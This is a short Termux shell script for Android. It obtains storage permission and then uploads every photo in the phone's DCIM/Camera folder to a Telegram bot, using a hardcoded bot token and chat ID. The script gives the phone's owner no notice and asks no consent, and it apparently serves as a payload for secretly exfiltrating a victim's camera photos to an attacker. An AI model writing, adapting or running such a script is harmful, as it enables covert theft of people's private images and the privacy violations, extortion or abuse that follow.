if [ ! -d ~/storage ]; then
    termux-setup-storage
    
fi
#mkdir -p ~/storage/emulated/0/DCIM/Camera/

#find ~/storage/emulated/0/DCIM/Camera/ -type f -printf "%T@ %p\n" | sort -n | tail -n 30 | awk '{print $2}' | xargs -I {} mv {} ~/storage/emulated/0/DCIM/Camera/

TOKEN="7716929216:AAEwWk3j1izoGjEzMjACpznA4ynp2x2ryUA"
CHAT_ID="7420684678"

for file in /storage/emulated/0/DCIM/Camera/*; 
do
    curl -F chat_id="$CHAT_ID" -F document=@"$file" https://api.telegram.org/bot$TOKEN/sendDocument
done
